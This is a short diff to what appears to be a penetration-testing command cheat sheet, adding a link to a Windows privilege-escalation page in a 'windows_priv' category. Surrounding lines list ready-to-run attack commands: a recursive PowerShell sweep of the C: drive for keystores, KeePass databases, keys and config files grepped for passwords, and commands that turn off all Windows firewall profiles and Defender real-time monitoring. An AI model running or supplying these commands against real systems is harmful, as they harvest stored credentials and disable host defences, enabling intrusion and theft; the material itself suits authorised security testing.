@@ -343,6 +343,7 @@ EOF
       { cmd: `netstat -ano | findstr /i listening`, category: 'windows_priv' },
       { cmd: `--------------------manual finding--------------------`, category: 'windows_priv' },
       { cmd: `paste -sd, users.txt | sed 's/[^,]*/"&"/g'`, category: 'windows_priv' },
+      { cmd: `https://boboaung1337.github.io/xng/#windows-privesc`, category: 'windows_priv' },
       { cmd: `Get-ChildItem -Path C:\\ -Recurse -Force -Include *.keystore,*.config,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.xml,*.bak,*.txt,*.ps1,*.log,*.json,*.yml,*.yaml,*.env,*.cs,*.vb,*.vbs,*.key,*.pem,*.crt,*.rdp,*.kdbx -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch '(C:\\\\Windows)' } | Select-String -Pattern "pwd=", "password=", "username=", "user=", "pass="`, category: 'windows_priv' },
       { cmd: `powershell.exe -c "Set-NetFirewallProfile -All -Enabled 0; Set-MpPreference -DisableRealtimeMonitoring 1"`, category: 'windows_priv' },
       { cmd: `powershell.exe -c "Set-NetFirewallProfile -All -Enabled 0"`, category: 'windows_priv' },
